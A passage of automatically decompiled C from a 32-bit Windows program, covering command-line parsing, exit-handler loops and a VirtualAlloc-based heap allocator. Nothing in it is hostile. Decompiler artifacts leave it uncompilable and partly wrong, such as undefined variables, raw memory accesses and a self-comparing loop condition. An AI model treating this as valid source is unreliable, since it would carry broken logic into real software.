			edi_104 = edi_104 + (eax_86 + 0x01) / 0x08;
		}
		eax_106 = eax_86 + 0x01;
		esi_108 = (word32) esi_108 + (eax_86 + 0x01);
	}
	edi_104->dw0000 = (word32) 0x00;
	if (ebx_43 != globals->t405114)
	{
		*(fp - 0x18) = (union Eq_2268 *) ebx_43;
		FreeEnvironmentStringsA(*(fp - 0x18));
	}
}

// 00402750: Register Eq_435 fn00402750()
Eq_435 fn00402750()
{
	Eq_435 eax_2 = GetCommandLineA();
	Eq_435 edx_10 = eax_2;
	if (*eax_2 == 0x22)
	{
		do
			edx_10 = edx_10 + 0x01;
		while (*edx_10 != 0x22 && *edx_10 != 0x00);
		if (*edx_10 == 0x22)
			edx_10 = edx_10 + 0x01;
	}
	else
	{
		while (*edx_10 > 0x20)
			edx_10 = edx_10 + 0x01;
	}
	while (true)
	{
		cu8 al_12 = *edx_10;
		if (al_12 == 0x00 || al_12 > 0x20)
			break;
		edx_10 = edx_10 + 0x01;
	}
	return edx_10;
}

// 00402790: void fn00402790(Register Eq_10 ebx, Stack Eq_1131 dwArg04)
void fn00402790(DWORD ebx, Eq_1131 dwArg04)
{
	ptr32 esp_2 = fp - 0x04;
	Eq_1131 ebx_19 = dwArg04;
	if (globals->dw405258 < 0x50)
	{
		do
		{
			uint32 eax_53 = globals->dw405258;
			globals->dw405258 = eax_53 + 0x01;
			byte SCZO_59;
			byte C_60;
			word32 eax_61;
			word32 edx_62;
			byte Z_63;
			byte SZO_64;
			word32 ecx_65;
			(*((char *) globals->a405118 + eax_53 * 0x04))();
		} while (globals->dw405258 < 0x50);
	}
	if (globals->dw40525C != 0x00)
	{
		do
		{
			ui32 eax_38 = globals->dw40525C;
			globals->dw40525C = eax_38 - 0x01;
			byte SCZO_44;
			byte C_45;
			word32 eax_46;
			word32 edx_47;
			byte Z_48;
			byte SZO_49;
			word32 ecx_50;
			(*((char *) globals->a405118 + (eax_38 - 0x01) * 0x04))();
		} while (globals->dw40525C != 0x00);
	}
	*(esp_2 - 0x04) = (union Eq_1131 *) ebx_19;
	fn00402140(dwArg00);
}

// 00402860: Register word32 fn00402860(Stack word32 dwArg04)
word32 fn00402860(word32 dwArg04)
{
	return dwArg04;
}

// 004028E0: Register word32 fn004028E0(Stack uint32 dwArg04)
word32 fn004028E0(uint32 dwArg04)
{
	word32 eax_137;
	word32 esi_24;
	uint32 ebx_23;
	***************************************************************************************************** eax_25 = fn00403270((dwArg04 + 0x03 >> 0x0E) + 0x01 << 0x10, out ebx_23, out esi_24);
	if (eax_25 == null)
	{
		globals->t40505C.u0 = 0x00;
		eax_137 = 0x00;
	}
	else
	{
		uint32 esi_229;
		***************************************************************************************************** edi_227;
		if ((char *) globals->ptr4056A8 + globals->dw4056AC == eax_25)
		{
			esi_229 = esi_24 + globals->dw4056AC;
			edi_227 = Mem0[4216488:word32];
			ebx_23 = esi_229 >> 0x02;
		}
		else
		{
			edi_227 = eax_25;
			esi_229 = (char *) eax_25 + (esi_24 - eax_25);
		}
		globals->ptr4056A8 = (****************************************************************************************************) ((char *) edi_227 + ebx_23 * 0x04);
		globals->dw4056AC = -(ebx_23 << 0x02) + esi_229;
		if (globals->ptr405284 + 0x01 == edi_227 && globals->ptr40528C != null)
		{
			ui32 * edi_196 = (char *) edi_227 - 0x04;
			uint32 eax_199 = (*edi_196 & 0x7FFFFFFF) + ebx_23;
			*edi_196 = ebx_23 | 0x80000000;
			ui32 * edx_204 = globals->ptr405284 + ebx_23 * 0x04;
			globals->ptr405284 = edx_204;
			*(edx_204 - 0x04) = *edi_196;
			*globals->ptr405284 = eax_199 | 0x80000000;
			(globals->ptr405284 - (eax_199 << 0x02))->dw0004 = eax_199 | 0x80000000;
			fn00403190(edi_196 + 0x01);
			eax_137 = 0x01;
		}
		else
		{
			***************************************************************************************************** eax_78 = globals->ptr40528C;
			Mem79[0x0040528C:word32] = edi_227;
			Mem80[edi_227 + 0x00:word32] = eax_78;
			ui32 * edi_81 = (char *) edi_227 + 0x04;
			globals->ptr405284 = edi_81;
			uint32 ebx_82 = ebx_23 - 0x01;
			ui32 * eax_84 = globals->ptr405288;
			if (eax_84 == null || eax_84 > edi_81)
				globals->ptr405288 = edi_81;
			int32 eax_107;
			*edi_81 = ebx_82 | 0x80000000;
			ui32 * eax_92 = globals->ptr405284 - 0x04 + ebx_82 * 0x04;
			globals->ptr405284 = eax_92;
			*eax_92 = ebx_82 | 0x80000000;
			ui32 * eax_98 = globals->ptr405284;
			if (ebx_82 - 0x02 <= globals->dw40529C)
			{
				if (ebx_82 - 0x02 <= globals->dw405294)
					eax_107 = (word32) (ebx_82 - 0x02 > globals->dw405290);
				else if (ebx_82 - 0x02 <= globals->dw405298)
					eax_107 = 0x02;
				else
					eax_107 = 0x03;
			}
			else if (ebx_82 - 0x02 <= globals->dw4052A4)
				eax_107 = ((word32) (ebx_82 - 0x02 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (ebx_82 - 0x02 <= globals->dw4052A8)
				eax_107 = 0x06;
			else
				eax_107 = 0x07;
			ptr32 edx_113;
			globals->dw4052B4 = eax_107;
			ptr32 eax_109 = globals->a405260[eax_107 * 0x04];
			if (eax_109 == 0x00)
			{
				globals->a405260[globals->dw4052B4 * 0x04] = eax_98 - 0x04;
				edx_113 = eax_98 - 0x04;
				eax_109 = eax_98 - 0x04;
				if (globals->dw4052B0 > globals->dw4052B4)
					globals->dw4052B0 = globals->dw4052B4;
			}
			else
				edx_113 = *(eax_109 - 0x08);
			*(eax_98 - 0x08) = eax_109;
			*(eax_109 - 0x08) = eax_98 - 0x04;
			*(edx_113 - 0x04) = eax_98 - 0x04;
			*(eax_98 - 0x0C) = edx_113;
			(-(ebx_82 - 0x02 << 0x02) + (eax_98 - 0x04))->dw0004 = ebx_82 - 0x02;
			*(eax_98 - 0x04) = ebx_82 - 0x02;
			globals->a405260[globals->dw4052B4 * 0x04] = eax_98 - 0x04;
			while (true)
			{
				int32 eax_132 = globals->dw4052B0;
				if (globals->a405260[eax_132 * 0x04] != 0x00 || eax_132 >= 0x07)
					break;
				globals->dw4052B0 = globals->dw4052B0 + 0x01;
			}
			eax_137 = 0x01;
		}
	}
	return eax_137;
}

// 00402B30: Register ptr32 fn00402B30(Stack Eq_1131 dwArg04, Register out ptr32 ebxOut, Register out ptr32 ediOut)
ptr32 fn00402B30(Eq_1131 dwArg04, ptr32 & ebxOut, ptr32 & ediOut)
{
	uint32 edx_19 = (word32) dwArg04 + 0x03 >> 0x02;
	uint32 ebx_101 = edx_19 + 0x02;
	if (edx_19 < ~0x01)
		ebx_101 = 0x04;
	int32 eax_31;
	if (ebx_101 <= globals->dw40529C)
	{
		if (ebx_101 <= globals->dw405294)
			eax_31 = (word32) (ebx_101 > globals->dw405290);
		else if (ebx_101 <= globals->dw405298)
			eax_31 = 0x02;
		else
			eax_31 = 0x03;
	}
	else if (ebx_101 <= globals->dw4052A4)
		eax_31 = ((word32) (ebx_101 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
	else if (ebx_101 <= globals->dw4052A8)
		eax_31 = 0x06;
	else
		eax_31 = 0x07;
	int32 esi_273 = eax_31;
	uint32 * edi_274 = null;
	uint32 dwLoc08_276 = 0x00;
	if (eax_31 < globals->dw4052B0)
	{
		esi_273 = globals->dw4052B0;
		dwLoc08_276 = 0x00;
		edi_274 = null;
	}
	while (dwLoc08_276 < ebx_101 && esi_273 < 0x08)
	{
		uint32 * eax_287 = globals->a405260[esi_273 * 0x04];
		esi_273 = esi_273 + 0x01;
		edi_274 = eax_287;
		if (eax_287 != null)
		{
			if (globals->ptr405284 + -0x01 == eax_287)
				edi_274 = *(eax_287 - 0x04);
			do
			{
				uint32 edx_300 = *edi_274;
				dwLoc08_276 = edx_300;
				if (edx_300 >= ebx_101)
					break;
				edi_274 = *(edi_274 - 0x04);
			} while (edi_274 != edi_274);
		}
	}
	ptr32 eax_114;
	if (dwLoc08_276 < ebx_101)
	{
		eax_114 = fn004028E0(ebx_101);
		if (eax_114 == 0x00)
			goto l00402E1E;
		esi_273 = globals->dw4052B4;
		edi_274 = globals->a405260[esi_273 * 0x04];
		dwLoc08_276 = *edi_274;
	}
	else if (esi_273 > 0x00)
		esi_273 = esi_273 - 0x01;
	uint32 eax_88 = dwLoc08_276 - ebx_101;
	if (eax_88 >= 0x04)
	{
		int32 dwLoc0C_119;
		if (eax_88 <= globals->dw40529C)
		{
			int32 edx_204;
			if (eax_88 <= globals->dw405294)
				edx_204 = (word32) (eax_88 > globals->dw405290);
			else if (eax_88 <= globals->dw405298)
				edx_204 = 0x02;
			else
				edx_204 = 0x03;
			dwLoc0C_119 = edx_204;
		}
		else if (eax_88 <= globals->dw4052A4)
			dwLoc0C_119 = ((word32) (eax_88 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
		else if (eax_88 <= globals->dw4052A8)
			dwLoc0C_119 = 0x06;
		else
			dwLoc0C_119 = 0x07;
		if (dwLoc0C_119 != esi_273)
		{
			uint32 * edx_126 = *(edi_274 - 0x04);
			if (edi_274 == edx_126)
			{
				globals->a405260[esi_273 * 0x04] = 0x00;
				if (globals->dw4052B0 == esi_273)
				{
					while (true)
					{
						int32 ecx_173 = globals->dw4052B0;
						if (globals->a405260[ecx_173 * 0x04] != 0x00 || ecx_173 >= 0x07)
							break;
						globals->dw4052B0 = globals->dw4052B0 + 0x01;
					}
				}
			}
			else
			{
				ptr32 ecx_182 = *(edi_274 - 0x08);
				*(ecx_182 - 0x04) = edx_126;
				*(edx_126 - 0x08) = ecx_182;
				if (globals->a405260[esi_273 * 0x04] == edi_274)
					globals->a405260[esi_273 * 0x04] = ecx_182;
			}
			uint32 * dwLoc18_139;
			uint32 * edx_135 = globals->a405260[dwLoc0C_119 * 0x04];
			if (edx_135 == null)
			{
				globals->a405260[dwLoc0C_119 * 0x04] = edi_274;
				dwLoc18_139 = edi_274;
				edx_135 = edi_274;
				if (globals->dw4052B0 > dwLoc0C_119)
					globals->dw4052B0 = dwLoc0C_119;
			}
			else
				dwLoc18_139 = *(edx_135 - 0x08);
			*(edi_274 - 0x04) = edx_135;
			*(edx_135 - 0x08) = edi_274;
			*(dwLoc18_139 - 0x04) = edi_274;
			*(edi_274 - 0x08) = dwLoc18_139;
			(edi_274 + -(eax_88 << 0x02))[0x01] = eax_88;
			*edi_274 = eax_88;
		}
		else
		{
			(edi_274 + -(eax_88 << 0x02))[0x01] = eax_88;
			*edi_274 = eax_88;
		}
	}
	else
	{
		uint32 * eax_234 = *(edi_274 - 0x04);
		if (edi_274 == eax_234)
		{
			globals->a405260[esi_273 * 0x04] = 0x00;
			if (globals->dw4052B0 == esi_273)
			{
				while (true)
				{
					int32 edx_251 = globals->dw4052B0;
					if (globals->a405260[edx_251 * 0x04] != 0x00 || edx_251 >= 0x07)
						break;
					globals->dw4052B0 = globals->dw4052B0 + 0x01;
				}
			}
		}
		else
		{
			ptr32 edx_259 = *(edi_274 - 0x08);
			*(edx_259 - 0x04) = eax_234;
			*(eax_234 - 0x08) = edx_259;
			if (globals->a405260[esi_273 * 0x04] == edi_274)
				globals->a405260[esi_273 * 0x04] = edx_259;
		}
		ebx_101 = dwLoc08_276;
	}
	word32 eax_106 = -(dwLoc08_276 * 0x02 * 0x02) + edi_274;
	ui32 eax_109 = ebx_101 | 0x80000000;
	eax_106[ebx_101 * 0x04 / 0x08] = (struct Eq_3060) eax_109;
	eax_106->dw0004 = eax_109;
	eax_114 = &eax_106->dw0004 + 0x01;
l00402E1E:
	word32 edi_69;
	*ediOut = *(fp - 0x24);
	word32 ebx_73;
	*ebxOut = *(fp - 0x1C);
	return eax_114;
}

// 00402E30: Register word32 fn00402E30(Stack Eq_1131 dwArg04, Register out ptr32 ebxOut, Register out Eq_1441 esiOut, Register out ptr32 ediOut)
word32 fn00402E30(Eq_1131 dwArg04, ptr32 & ebxOut, Eq_1441 & esiOut, ptr32 & ediOut)
{
	*ediOut = edi;
	Eq_1131 ebx_23 = dwArg04;
	word32 esi_10 = 0x00;
	if (dwArg04 < globals->t40505C)
	{
		word32 edi_54;
		esi_10 = fn00402B30(dwArg04, out ebx_23, out edi_54);
	}
	if (esi_10 == 0x00)
		esi_10 = fn004020A0(ebx_23);
	if (esi_10 == 0x00)
		globals->dw4052BC = 0x0C;
	word32 esi_37;
	*esiOut = *(fp - 0x08);
	word32 ebx_39;
	*ebxOut = *(fp - 0x04);
	return esi_10;
}

// 00402E70: void fn00402E70(Stack Eq_1131 dwArg04)
void fn00402E70(Eq_1131 dwArg04)
{
	if ((*((word32) dwArg04 - 0x04) & 0x80000000) == 0x00)
		globals->dw4052BC = 22;
	else
	{
		ui32 eax_52 = *((word32) dwArg04 - 0x04);
		uint32 eax_197 = eax_52 & 0x7FFFFFFF;
		struct Eq_3229 * edx_298 = dwArg04 - 0x08 + (eax_52 & 0x7FFFFFFF) * 0x04;
		int32 dwLoc08_289 = dwLoc08 | ~0x00;
		if ((edx_298->dw0004 & 0x80000000) == 0x00)
		{
			int32 dwLoc0C_284;
			struct Eq_3229 * esi_280 = edx_298 + (edx_298->dw0004 * 0x04) / 0x08;
			if (esi_280->dw0000 <= globals->dw40529C)
			{
				int32 ecx_304;
				if (esi_280->dw0000 <= globals->dw405294)
					ecx_304 = (word32) (esi_280->dw0000 > globals->dw405290);
				else if (esi_280->dw0000 <= globals->dw405298)
					ecx_304 = 0x02;
				else
					ecx_304 = 0x03;
				dwLoc0C_284 = ecx_304;
			}
			else if (esi_280->dw0000 <= globals->dw4052A4)
				dwLoc0C_284 = ((word32) (esi_280->dw0000 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (esi_280->dw0000 <= globals->dw4052A8)
				dwLoc0C_284 = 0x06;
			else
				dwLoc0C_284 = 0x07;
			eax_197 = (eax_52 & 0x7FFFFFFF) + esi_280->dw0000;
			esi_280->dw0000 = eax_197;
			(esi_280 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
			dwLoc08_289 = dwLoc0C_284;
			edx_298 = esi_280;
		}
		if ((*(dwArg04 - 0x08) & 0x80000000) == 0x00)
		{
			int32 esi_202;
			eax_197 = eax_197 + *(dwArg04 - 0x08);
			if (*(dwArg04 - 0x08) <= globals->dw40529C)
			{
				int32 ecx_243;
				if (*(dwArg04 - 0x08) <= globals->dw405294)
					ecx_243 = (word32) (*(dwArg04 - 0x08) > globals->dw405290);
				else if (*(dwArg04 - 0x08) <= globals->dw405298)
					ecx_243 = 0x02;
				else
					ecx_243 = 0x03;
				esi_202 = ecx_243;
			}
			else if (*(dwArg04 - 0x08) <= globals->dw4052A4)
				esi_202 = ((word32) (*(dwArg04 - 0x08) <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (*(dwArg04 - 0x08) <= globals->dw4052A8)
				esi_202 = 0x06;
			else
				esi_202 = 0x07;
			ptr32 ecx_204 = *(dwArg04 - 0x0C);
			if (dwArg04 - 0x08 == ecx_204)
			{
				globals->a405260[esi_202 * 0x04] = 0x00;
				if (globals->dw4052B0 == esi_202)
				{
					while (true)
					{
						int32 esi_224 = globals->dw4052B0;
						if (globals->a405260[esi_224 * 0x04] != 0x00 || esi_224 >= 0x07)
							break;
						globals->dw4052B0 = globals->dw4052B0 + 0x01;
					}
				}
			}
			else
			{
				ptr32 esi_232 = *(dwArg04 - 0x10);
				*(esi_232 - 0x04) = ecx_204;
				*(ecx_204 - 0x08) = esi_232;
				if (globals->a405260[esi_202 * 0x04] == dwArg04 - 0x08)
					globals->a405260[esi_202 * 0x04] = esi_232;
			}
			edx_298->dw0000 = eax_197;
			(edx_298 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
		}
		int32 ebx_163;
		if (eax_197 <= globals->dw40529C)
		{
			int32 ecx_161;
			if (eax_197 <= globals->dw405294)
				ecx_161 = (word32) (eax_197 > globals->dw405290);
			else if (eax_197 <= globals->dw405298)
				ecx_161 = 0x02;
			else
				ecx_161 = 0x03;
			ebx_163 = ecx_161;
		}
		else if (eax_197 <= globals->dw4052A4)
			ebx_163 = ((word32) (eax_197 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
		else if (eax_197 <= globals->dw4052A8)
			ebx_163 = 0x06;
		else
			ebx_163 = 0x07;
		if (dwLoc08_289 != ebx_163)
		{
			if (dwLoc08_289 >= 0x00)
			{
				struct Eq_3229 * ecx_129 = *(edx_298 - 0x04);
				if (edx_298 == ecx_129)
				{
					globals->a405260[dwLoc08_289 * 0x04] = 0x00;
					if (globals->dw4052B0 == dwLoc08_289)
					{
						while (true)
						{
							int32 ebx_140 = globals->dw4052B0;
							if (globals->a405260[ebx_140 * 0x04] != 0x00 || ebx_140 >= 0x07)
								break;
							globals->dw4052B0 = globals->dw4052B0 + 0x01;
						}
					}
				}
				else
				{
					ptr32 ebx_148 = *(edx_298 - 0x08);
					*(ebx_148 - 0x04) = (struct Eq_3229 **) ecx_129;
					*(ecx_129 - 0x08) = ebx_148;
					if (globals->a405260[dwLoc08_289 * 0x04] == edx_298)
						globals->a405260[dwLoc08_289 * 0x04] = ebx_148;
				}
			}
			struct Eq_3229 * ebx_107;
			struct Eq_3229 * ecx_106 = globals->a405260[ebx_163 * 0x04];
			if (ecx_106 == null)
			{
				globals->a405260[ebx_163 * 0x04] = edx_298;
				ebx_107 = edx_298;
				ecx_106 = edx_298;
				if (globals->dw4052B0 > ebx_163)
					globals->dw4052B0 = ebx_163;
			}
			else
				ebx_107 = (struct Eq_3229 *) *(ecx_106 - 0x08);
			*(edx_298 - 0x04) = (struct Eq_3229 **) ecx_106;
			*(ecx_106 - 0x08) = (struct Eq_3229 **) edx_298;
			*(ebx_107 - 0x04) = (struct Eq_3229 **) edx_298;
			*(edx_298 - 0x08) = (struct Eq_3229 **) ebx_107;
			(edx_298 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
			edx_298->dw0000 = eax_197;
			globals->dw4052B4 = ebx_163;
			globals->a405260[ebx_163 * 0x04] = edx_298;
		}
	}
}

// 00403190: void fn00403190(Stack Eq_1131 dwArg04)
void fn00403190(Eq_1131 dwArg04)
{
	if (dwArg04 != 0x00)
	{
		if (dwArg04 - 0x04 > globals->ptr405288 && dwArg04 - 0x04 < globals->ptr405284)
			fn00402E70(dwArg04);
		else
			fn004020E0(dwArg04);
	}
}

// 00403270: Register Eq_1131 fn00403270(Stack uint32 dwArg04, Register out ptr32 ebxOut, Register out ptr32 esiOut)
Eq_1131 fn00403270(uint32 dwArg04, ptr32 & ebxOut, ptr32 & esiOut)
{
	Eq_1131 eax_29;
	struct Eq_3644 * esp_10 = fp - 0x28;
	if (globals->t405054 == 0x00)
	{
		eax_29 = VirtualAlloc(0x00, globals->t405058, 0x2000, 0x01);
		globals->t405054 = eax_29;
		esp_10 = fp - 0x38;
		if (eax_29 == 0x00)
		{
l004032FF:
			word32 esi_33;
			*esiOut = esp_10->dw0000;
			word32 ebx_35;
			*ebxOut = esp_10->dw0004;
			return eax_29;
		}
	}
	union Eq_1131 * esp_46 = esp_10 - 0x04;
	*esp_46 = (union Eq_1131 *) 0x1C;
	*(esp_46 - 0x04) = fp - 0x20;
	*(esp_46 - 0x08) = (union Eq_1131 *) globals->t405054;
	esp_10 = esp_46 - 0x08;
	eax_29 = VirtualQuery(*(esp_46 - 0x08), *(esp_46 - 0x04), *esp_46);
	if (eax_29 != 0x00)
	{
		Eq_1131 eax_62;
		if (dwLoc10 == 0x1000)
			eax_62 = (word32) globals->t405054 + dwLoc14;
		else
			eax_62 = globals->t405054;
		if (dwArg04 + eax_62 >=u Mem53[0x00405058:word32] + Mem53[0x00405054:word32])
			eax_29.u0 = 0x00;
		else
		{
			*(esp_46 - 0x0C) = 0x04;
			*(esp_46 - 0x10) = 0x1000;
			*(esp_46 - 0x14) = dwArg04;
			*(esp_46 - 0x18) = (union Eq_1131 *) eax_62;
			esp_10 = esp_46 - 0x18;
			eax_29 = VirtualAlloc(*(esp_46 - 0x18), *(esp_46 - 0x14), *(esp_46 - 0x10), *(esp_46 - 0x0C));
			if (eax_29 != 0x00)
				eax_29 = eax_62;
		}
	}
	goto l004032FF;
}

